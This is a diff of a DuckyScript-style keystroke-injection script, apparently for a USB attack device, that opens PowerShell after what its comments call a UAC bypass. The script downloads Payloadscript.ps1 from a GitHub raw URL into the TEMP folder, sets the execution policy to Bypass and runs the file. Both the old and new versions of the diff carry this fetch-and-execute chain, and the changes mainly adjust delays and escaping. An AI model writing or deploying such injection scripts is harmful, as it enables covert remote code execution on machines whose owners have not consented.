@@ -32,34 +32,33 @@ QUACK DELAY 150
 QUACK ENTER
 QUACK DELAY 350
 QUACK TAB
-QUACK DELAY 100
+QUACK TAB
+QUACK TAB
 QUACK TAB
 QUACK DELAY 100
 QUACK TAB
-QUACK DELAY 100
 QUACK TAB
-QUACK DELAY 100
-QUACK TAB
-QUACK DELAY 100
-QUACK TAB
-QUACK DELAY 100
 QUACK ENTER
 QUACK DELAY 300
 QUACK STRING "powershell"
 QUACK ENTER
+QUACK DELAY 1000
 
 REM UAC Bypassed now we have a sys32 powershell proc running
 
-QUACK STRING "$scriptUrl = 'https://raw.githubusercontent.com/GHXSTFPS/powershell-bypass/main/V1/Payloadscript.ps1'"
+REM Executing Script
+QUACK STRING "\$scriptUrl = 'https://raw.githubusercontent.com/GHXSTFPS/powershell-bypass/main/V1/Payloadscript.ps1'"
 QUACK ENTER
-QUACK STRING "$dest = $env:TEMP + '\Payloadscript.ps1'"
+QUACK STRING "\$dest = \$env:TEMP + '\Payloadscript.ps1'"
 QUACK ENTER
-QUACK STRING "Invoke-WebRequest -Uri $scriptUrl -OutFile $dest"
+QUACK STRING "Invoke-WebRequest -Uri \$scriptUrl -OutFile \$dest"
 QUACK ENTER
 QUACK DELAY 1000
 QUACK STRING "Set-ExecutionPolicy Bypass"
 QUACK ENTER
-QUACK STRING "& $dest"
+QUACK STRING "A"
+QUACK ENTER
+QUACK STRING "& \$dest"
 QUACK ENTER
 QUACK LED G
-ATTACKMODE OFF
+QUACK ATTACKMODE OFF
